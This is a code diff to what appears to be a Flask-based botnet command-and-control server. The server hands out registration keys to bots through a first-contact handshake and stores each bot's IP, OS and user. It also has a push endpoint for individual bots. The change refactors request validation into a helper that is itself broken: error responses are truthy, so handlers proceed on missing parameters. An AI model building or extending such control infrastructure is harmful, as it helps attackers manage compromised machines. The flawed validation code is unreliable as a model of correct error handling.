@@ -30,7 +30,7 @@ REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
 
 # TODO: Implement this function 
-def postcheck(requestobj):
+def postcheck(requestobj, *args):
     """
     Description: Post check will see if the incoming post request from python flask 
     has any errors or not. 
@@ -50,7 +50,16 @@ def postcheck(requestobj):
     if request.method != 'POST':
         return jsonify({'error': 'wrong HTTP method'})
 
+    data = requestobj.form
 
+    for arg in args:
+        try:
+            if data[arg] is None:
+                return jsonify({'error': 'parameter'+str(arg)+'is missing'})
+        except Exception as e:
+            return jsonify({'error': str(e)})
+
+    return True 
 
 def init_db():
     db.drop_all()
@@ -102,24 +111,11 @@ def firstcontact():
 
     data = request.form
 
-    print("[DEBUG] firstcontact data = ", data)
-
-    try:
-        # Error checking 
-        if data is None:
-            return jsonify({'result': 'firstcontactkey is required'})
-        elif data['firstcontactkey'] is None:
-            return jsonify({'result': 'wrong'})
-        elif data['firstcontactkey'] != FIRSTCONTACTKEY:
-            return jsonify({'result': 'wrong firstcontactkey'})
-        
-        # Successful first contact. Return register key 
-        # TODO: Implement random register key for each bot? 
-        elif data['firstcontactkey'] == FIRSTCONTACTKEY:
+    if (postcheck(request, 'firstcontactkey')):
+        if data['firstcontactkey'] == FIRSTCONTACTKEY:
             return jsonify({'result': 'success', 'registerkey': 'registerkey'})
-
-    except Exception as e:
-        return ''
+        else:
+            return jsonify({'error': 'wrong firstcontactkey'})
 
 @app.route('/register', methods=['POST'])
 def register():
@@ -144,18 +140,7 @@ def register():
 
     print("[DEBUG] firstcontact data = ", data)
 
-    # Error checking for post request and data parameters 
-    try:
-        if data is None:
-            return jsonify({'error': 'Could not process body parameters'})
-        if registerkey is None:
-            return jsonify({'error': 'regsiterkey is required'})
-        if bot_ip is None:
-            return jsonify({'error': 'ip is required'})
-        if bot_os is None:
-            return jsonify({'error': 'os is required'})
-   
-        # Check if bot already exists in the database      
+    if(postcheck(request, 'registerkey', 'ip', 'os', 'user')):
         try:
             query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
         except Exception as e:
@@ -164,7 +149,6 @@ def register():
         if query_bot is not None:
             return jsonify({'error': 'Bot already registered'})
 
-        # Register a new bot, and add it to the database 
         else:
             print("[+] Added a new bot !")
             bot = Bot(bot_ip, bot_os, bot_user)
@@ -173,8 +157,6 @@ def register():
 
             return jsonify({'result': 'Bot was added'})
 
-    except Exception as e:
-        return '' 
 
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
 def botpush(bot_ip):
